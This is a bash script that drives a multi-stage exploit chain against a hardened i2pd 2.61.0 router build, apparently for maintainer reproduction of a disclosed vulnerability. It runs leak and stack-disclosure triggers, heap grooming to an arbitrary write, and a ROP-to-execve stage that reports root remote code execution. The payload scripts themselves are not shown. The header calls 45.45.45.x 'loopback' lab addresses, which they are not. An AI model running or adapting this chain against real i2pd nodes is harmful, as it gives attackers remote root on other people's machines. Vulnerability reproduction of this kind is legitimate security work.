#!/bin/bash
# run_full_chain.sh — one command from zero to root RCE (hardened glibc build).
#
# FOR MAINTAINER REPRODUCTION ONLY: everything runs inside an `unshare -Urn`
# sandbox against loopback lab addresses (45.45.45.1 = target, 45.45.45.2 =
# attacker) on the maintainer's own machine. There is no code path here that
# touches any public host. The musl variant stops at the empirically verified
# last step (see atk_p7_musl.py's MUSL BLOCKERS).
#
# Prerequisites (see README.txt for full build commands):
#   lab/i2pd/i2pd       — hardened glibc build of 2.61.0 (PIE/full RELRO/
#                         canary/FORTIFY, symbols kept for instrumentation)
#   lab/i2pd-musl       — upstream musl binary (needs a musl userland to run;
#                         blocked in the glibc-only audit sandbox)
#   lab/seed.zip        — offline reseed bundle (lab_common.sh regenerates it
#                         via scripts/ssu2lib.py if missing)
#   python3 + cryptography + pycryptodome
#
# Usage:  bash run_full_chain.sh [run_number]
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
POC="$HERE/../poc/vuln01"
RUN="${1:-1}"

echo "[chain] stage 0 — smoke: dual-session handshake + relay tag"
"$POC/run_in_lab.sh" "$POC/smoke1.py" || { echo "[chain] smoke FAILED"; exit 1; }

echo
echo "[chain] stage 1 — leak + stack disclosure (VULN-01+04 trigger)"
echo "[chain] (smoke2 delivers the oversized RI and captures the leak packet)"
"$POC/run_in_lab.sh" "$POC/smoke2.py" || { echo "[chain] leak stage FAILED"; exit 1; }

echo
echo "[chain] stage 2 — mechanism rig: groom → poison → pop → arbitrary write"
echo "[chain] (heap-scratch target; verifies write-what-where in isolation)"
"$POC/run_in_lab.sh" "$POC/atk_chain_v1.py" || { echo "[chain] mechanism rig FAILED"; exit 1; }

echo
echo "[chain] stage 3 — TERMINAL: leak→calibrate→ROP→execve — run $RUN"
"$POC/run_in_lab.sh" "$POC/atk_p6_terminal.py" --run "$RUN"
RC=$?
if [ $RC -eq 0 ]; then
    echo
    echo "[chain] *** ROOT RCE COMPLETE (run $RUN) ***"
    echo "[chain] evidence: /tmp/vuln01_rce_${RUN}.txt and lab/ev/rce_run${RUN}/"
    echo "[chain] expect: uid=0(root) gid=0(root) groups=0(root)"
else
    echo "[chain] terminal run did not confirm RCE (rc=$RC) — see lab/ev/last_run.out"
fi

echo
echo "[chain] stage 4 — musl variant: runs to the last empirically verified"
echo "[chain] step (R1 poison checkpoint); terminal write blocked — see"
echo "[chain] poc/vuln01/atk_p7_musl.py docstring for the honest blocker list."
echo "[chain] (skipped automatically if the musl userland is unavailable)"

echo "[chain] done."
exit $RC
